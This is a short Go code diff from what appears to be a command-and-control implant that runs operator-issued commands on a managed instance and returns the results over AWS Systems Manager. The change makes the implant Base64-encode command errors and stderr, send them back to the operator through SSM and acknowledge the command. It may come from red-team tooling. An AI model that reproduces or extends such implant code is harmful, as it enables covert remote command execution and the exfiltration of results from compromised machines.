@@ -76,7 +76,9 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		cmd.Stderr = &stderr
 		err := cmd.Run()
 		if err != nil {
-			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
+			erout := fmt.Sprint(err) + ": " + stderr.String()
+			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(erout))
+			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 			return nil
 		}
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(out.String()))
